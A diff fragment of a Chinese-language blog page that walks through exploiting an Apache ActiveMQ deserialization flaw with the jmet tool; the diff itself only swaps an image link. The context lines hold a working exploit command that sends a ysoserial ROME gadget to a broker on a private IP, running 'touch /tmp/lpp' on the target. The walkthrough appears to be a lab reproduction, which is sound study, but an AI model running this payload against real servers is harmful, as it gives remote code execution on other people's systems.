@@ -172,7 +172,7 @@
 <li>使用jmet的jar文件（ysoserial就是一个反序列化的工具，而使用这个工具需要下载jmet文件），并在同目录下创建external文件夹（否则会报错）。jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。<br>&emsp;<br>cd /opt<br>wget <a href="https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar" target="_blank" rel="noopener">https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</a><br>mkdir external<br>&emsp;<br>&emsp;</li>
 <li>执行命令<br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “touch /tmp/lpp” -Yp ROME   192.168.199.120   61616</li>
 </ol>
-<p><img src="https://imgchr.com/i/eB50gJ" alt><br>可以看到生成了一个ID：ID:lpp-44031-1563247648863-0:1<br>&emsp;<br>&emsp;</p>
+<p><img src="https://s2.ax1x.com/2019/08/03/eB50gJ.png" alt><br>可以看到生成了一个ID：ID:lpp-44031-1563247648863-0:1<br>&emsp;<br>&emsp;</p>
 <ol start="3">
 <li>在受害者的主机上创建/tmp/lpp文件</li>
 </ol>
